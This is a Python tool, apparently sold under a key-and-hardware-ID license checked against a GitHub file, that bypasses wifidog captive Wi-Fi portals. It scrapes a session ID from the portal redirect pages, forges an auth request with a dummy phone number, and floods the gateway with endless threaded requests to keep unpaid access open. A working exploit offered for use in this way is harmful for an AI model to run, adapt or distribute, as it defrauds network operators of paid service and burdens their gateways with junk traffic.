import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import subprocess
import hashlib
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 10
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2

# COLOR SYSTEM
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# GITHUB DATABASE LINK
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

# ===============================
# UNIQUE HWID GENERATOR (SECURE)
# ===============================
def get_hwid():
    """ဖုန်းတစ်လုံးချင်းစီအတွက် လုံးဝမတူညီသော ID ထုတ်ပေးခြင်း"""
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f:
                return f.read().strip()
        
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        
        with open(id_file, "w") as f:
            f.write(new_id)
        return new_id
    except:
        return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]:
        return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        current_date = datetime.datetime.now()
        if current_date > expiry_date:
            return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except:
        return True, "Lifetime"

# ===============================
# UI FUNCTIONS (ပြန်ထည့်ပေးထားသည်)
# ===============================
def display_hacker_flag():
    w = 40 
    yellow = f"[bold on yellow]{' ' * w}[/bold on yellow]"
    green  = f"[bold on green]{' ' * 19}★{' ' * 20}[/bold on green]"
    red    = f"[bold on red]{' ' * w}[/bold on red]"
    console.print(Align.center(Panel(f"{yellow}\n{green}\n{red}", border_style="bold white", padding=(0, 0), expand=False)))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]"))
    console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))

def simpler_hacker_typing(text, style="bold green"):
    prefix = "[bold #00FF00]>>> [/bold #00FF00]"
    console.print(prefix, end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

def success_fireworks():
    """အောင်မြင်တဲ့အခါ ပြမယ့် ကြယ်လေးတွေနဲ့ မီးပန်းလေးများ"""
    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
    for _ in range(2):
        for _ in range(12):
            fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🔥", "⚡", "🌟", "⭐"])
            console.print(Text(fire, style=random.choice(colors)))
            time.sleep(0.02)

def hacking_status(message, duration=0.8):
    with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
        time.sleep(duration + random.uniform(0.1, 0.4))

# ===============================
# LICENSE CHECK SYSTEM
# ===============================
def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    display_hacker_flag()
    
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", 
                                     title="[bold red]DEVICE INFO[/bold red]", 
                                     border_style="bold cyan", expand=False)))
    
    console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))

    try:
        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except EOFError: user_key = ""
    
    if not user_key: sys.exit()

    hacking_status("Connecting to Secure Server...")
    try:
        response = requests.get(URL, timeout=10)
        lines = [line.strip() for line in response.text.splitlines() if line.strip()]
        
        found = False
        hacking_status("Verifying HWID & Expiry...")
        
        for entry in lines:
            parts = entry.split("|")
            db_key = parts[0].strip()
            exp_date = parts[1].strip() if len(parts) > 1 else "None"
            db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"

            if user_key == db_key:
                found = True
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    simpler_hacker_typing("ACCESS_DENIED: HWID_MISMATCH", style="bold red")
                    console.print(f"\n[bold red]❌ ဒီ Key က တခြားဖုန်းမှာ သုံးထားပြီးသားဖြစ်နေပါတယ်![/bold red]")
                    console.print(f"[bold yellow]⚠️ သင့် HWID ({my_hwid}) ကို Admin ဆီပို့ပြီး အတည်ပြုခိုင်းပါ။[/bold yellow]")
                    sys.exit()
                
                is_active, date_label = check_expiry(exp_date)
                if is_active:
                    success_fireworks() # ကြယ်လေးတွေ ဒီမှာ ပေါ်ပါမယ်
                    simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                    return True
                else:
                    console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
                    sys.exit()

        console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
        sys.exit()

    except Exception as e:
        console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE
# ===============================
def check_real_internet():
    try: return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def start_bypass_process():
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if not sid:
                time.sleep(5)
                continue
            
            parsed_portal = urlparse(portal_url)
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            
            for _ in range(PING_THREADS):
                threading.Thread(target=lambda: [session.get(auth_link) for _ in iter(int, 1)], daemon=True).start()
            
            while check_real_internet(): time.sleep(5)
        except: time.sleep(5)

# ===============================
# MAIN RUNNER
# ===============================
if __name__ == "__main__":
    try:
        if check_license_hacker_style():
            with console.status("[bold green]Injecting Packets...", spinner="shark"):
                time.sleep(1.5)
            console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
            start_bypass_process()
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
        sys.exit()
